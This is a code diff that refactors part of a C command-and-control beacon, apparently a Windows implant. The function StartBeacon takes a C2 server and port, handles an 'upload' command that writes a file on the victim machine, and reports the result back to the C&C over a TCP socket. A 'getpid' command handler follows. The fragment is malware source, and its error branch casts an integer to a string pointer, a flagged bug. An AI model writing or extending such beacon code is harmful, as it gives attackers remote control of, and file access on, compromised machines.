@@ -355,39 +355,20 @@ void StartBeacon(char* C2Server, int C2Port)
 				// uploading
 				int result;
 				result = upload(filename,cntptr);
-				
-				/* #region Parse result AND send reponse */
-				if (result == 0) {
-					// C&C part
-					char buffer[255];
-					memset(buffer, 0, sizeof(buffer));
-					strcat(buffer,"\nUploaded ");
-					strcat(buffer,filename);
-					strcat(buffer,"\n");
-					
-					send(tcpsock,buffer,strlen(buffer)+1,0);
-					// clear buffers
-					memset(contents, 0, sizeof(contents));
-					memset(buffer, 0, sizeof(buffer));
-					memset(RecvData, 0, sizeof(RecvData)); 
-				}
-				else {
-					// C&C part
-					char buffer[255];
-					memset(buffer, 0, sizeof(buffer));
-					strcat(buffer,"Failed to write file. Errno from fopen: %d");
-					strcat(buffer, (char*)result);
-					strcat(buffer, " Filename: ");
-					strcat(buffer,filename);
-					strcat(buffer, "\n");
 
-					send(tcpsock,buffer,strlen(buffer)+1,0);
-					// clear buffers
-					memset(contents, 0, sizeof(contents));
-					memset(buffer, 0, sizeof(buffer));
-					memset(RecvData, 0, sizeof(RecvData));
-				}
-				/* #endregion */
+				// C&C part
+				char buffer[255];
+				memset(buffer, 0, sizeof(buffer));
+				if (result == 0) { strcat(buffer,"\nUploaded "); strcat(buffer,filename); }
+				// TODO check if this else works correctly!!
+				else { strcat(buffer,"Failed to write file. Errno from fopen: "); strcat(buffer, (char*)result); }
+				strcat(buffer,"\n");
+				
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				// clear buffers
+				memset(contents, 0, sizeof(contents));
+				memset(buffer, 0, sizeof(buffer));
+				memset(RecvData, 0, sizeof(RecvData)); 
 			}
 			else if (strcmp(command, "getpid\n") == 0) {
 				DWORD pid;
